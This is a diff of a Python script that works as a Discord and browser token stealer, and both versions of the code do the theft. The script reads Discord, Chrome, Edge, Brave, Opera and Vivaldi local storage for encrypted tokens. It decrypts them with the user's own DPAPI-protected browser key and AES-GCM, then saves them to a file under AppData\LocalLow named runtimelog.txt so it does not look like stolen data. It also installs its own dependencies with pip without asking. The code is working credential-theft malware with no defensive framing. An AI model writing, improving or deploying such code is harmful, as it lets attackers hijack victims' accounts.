@@ -1,109 +1,68 @@
 def run():
-    import os
-    import subprocess
-    import sys
-    import json
-    import urllib.request
-    import re
-    import base64
-    import datetime
-    user=os.getlogin()
-    def install_import(modules):
-        for module, pip_name in modules:
+    import os, subprocess, sys, json, urllib.request, re, base64
+    user = os.getlogin()
+
+    def install_import(mods):
+        for m, p in mods:
             try:
-                __import__(module)
-            except ImportError:
-                subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
+                __import__(m)
+            except:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", p])
                 os.execl(sys.executable, sys.executable, *sys.argv)
 
     install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
-
     import win32crypt
     from Crypto.Cipher import AES
 
-    LOCAL = os.getenv("LOCALAPPDATA")
-    ROAMING = os.getenv("APPDATA")
-    PATHS = {
-        'Discord': ROAMING + '\\discord',
-        'Discord Canary': ROAMING + '\\discordcanary',
-        'Lightcord': ROAMING + '\\Lightcord',
-        'Discord PTB': ROAMING + '\\discordptb',
-        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
-        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
-        'Amigo': LOCAL + '\\Amigo\\User Data',
-        'Torch': LOCAL + '\\Torch\\User Data',
-        'Kometa': LOCAL + '\\Kometa\\User Data',
-        'Orbitum': LOCAL + '\\Orbitum\\User Data',
-        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
-        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
-        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
-        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
-        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
-        'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
-        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
-        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
-        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+    L = os.getenv("LOCALAPPDATA")
+    R = os.getenv("APPDATA")
+    P = {
+        'Discord': R + '\\discord',
+        'Canary': R + '\\discordcanary',
+        'PTB': R + '\\discordptb',
+        'Opera': R + '\\Opera Software\\Opera Stable',
+        'OperaGX': R + '\\Opera Software\\Opera GX Stable',
+        'Chrome': L + '\\Google\\Chrome\\User Data\\Default',
+        'Edge': L + '\\Microsoft\\Edge\\User Data\\Default',
+        'Brave': L + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Vivaldi': L + '\\Vivaldi\\User Data\\Default'
     }
 
-    def getheaders(token=None):
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
-        }
-
-        if token:
-            headers.update({"Authorization": token})
-
-        return headers
-
-    def gettokens(path):
-        path += "\\Local Storage\\leveldb\\"
-        tokens = []
-
-        if not os.path.exists(path):
-            return tokens
-
-        for file in os.listdir(path):
-            if not file.endswith(".ldb") and file.endswith(".log"):
-                continue
-
+    def gettokens(p):
+        p += "\\Local Storage\\leveldb\\"
+        t = []
+        if not os.path.exists(p): return t
+        for f in os.listdir(p):
+            if not f.endswith(".ldb") and not f.endswith(".log"): continue
             try:
-                with open(f"{path}{file}", "r", errors="ignore") as f:
-                    for line in (x.strip() for x in f.readlines()):
-                        for values in re.findall(r"dQw4w9WgXcQ:[^\"]+", line):
-                            tokens.append(values)
-            except PermissionError:
-                continue
+                with open(p + f, "r", errors="ignore") as r:
+                    for line in r:
+                        for val in re.findall(r"dQw4w9WgXcQ:[^\"]+", line.strip()):
+                            t.append(val)
+            except: continue
+        return t
 
-        return tokens
-        
-    def getkey(path):
-        with open(path + f"\\Local State", "r") as file:
-            key = json.loads(file.read())['os_crypt']['encrypted_key']
-            file.close()
-
-        return key
-
-    def getip():
-        try:
-            with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
-                return json.loads(response.read().decode()).get("ip")
-        except:
-            return "None"
+    def getkey(p):
+        with open(p + "\\Local State", "r") as f:
+            return json.loads(f.read())['os_crypt']['encrypted_key']
 
     def main():
-        for _, path in PATHS.items():
-            if not os.path.exists(path):
-                continue
+        for _, p in P.items():
+            if not os.path.exists(p): continue
+            for tok in gettokens(p):
+                try:
+                    tok = tok.replace("\\", "") if tok.endswith("\\") else tok
+                    k = win32crypt.CryptUnprotectData(base64.b64decode(getkey(p))[5:], None, None, None, 0)[1]
+                    et = base64.b64decode(tok.split('dQw4w9WgXcQ:')[1])
+                    iv = et[3:15]
+                    payload = et[15:]
+                    cipher = AES.new(k, AES.MODE_GCM, iv)
+                    d = cipher.decrypt(payload)[:-16].decode()
+                    with open(f'C:\\Users\\{user}\\AppData\\LocalLow\\runtimelog.txt', 'a') as out:
+                        out.write(d + '\n')
+                except: continue
 
-                for token in gettokens(path):
-                    token = token.replace("\\", "") if token.endswith("\\") else token
-                    token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
-                with open(f'C:\\Users\\{user}\\AppData\\LocalLow\\runtimelog.txt', 'a') as rnt:
-                    rnt.write(token)
-    if __name__ == "__main__":
-        run()
+    main()
 
+if __name__ == "__main__":
+    run()
